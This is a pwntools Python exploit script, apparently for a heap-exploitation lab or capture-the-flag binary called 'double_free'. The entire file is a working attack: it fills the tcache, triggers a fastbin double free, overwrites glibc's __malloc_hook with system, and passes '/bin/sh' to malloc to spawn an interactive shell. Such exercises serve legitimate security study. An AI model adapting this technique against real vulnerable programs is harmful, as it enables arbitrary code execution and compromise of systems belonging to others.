#!/usr/bin/python3
from pwn import *
#context.log_level='DEBUG'

p = process("./double_free", env={"LD_PRELOAD":"../use_after_free/libc.so.6"})
elf = ELF("./double_free", checksec=False)
libc = elf.libc

END_OF_MENU = b"e.g, l\n"

def malloc(size):
	p.send(b"m %d" % size)
	p.recvuntil(END_OF_MENU)

def free(idx):
	p.sendline(b"f %d" % idx)
	p.recvuntil(END_OF_MENU)

def edit(idx, data):
	p.send(b"e %d %b" % (idx, data))
	p.recvuntil(END_OF_MENU)

def list():
	p.send("l")
	pointers = p.recvline()
	log.info(pointers)
	p.recvuntil(END_OF_MENU)

if __name__=="__main__":

	pause()
	for i in range(9):
		malloc(24) # 0 -> 8

	for i in range(7):
		free(i)

	free(7)
	free(8)
	free(7)

	for i in range(7):
		malloc(24) # 9 -> 15

	malloc(24) # 16
	edit(16, p64(libc.sym.__malloc_hook))
	malloc(24) # 17
	malloc(24) # 18
	malloc(24) # 19
	edit(19, p64(libc.symbols['system']))
	bin_sh = next(libc.search(b"/bin/sh\x00"))
	malloc(bin_sh)

	p.interactive()

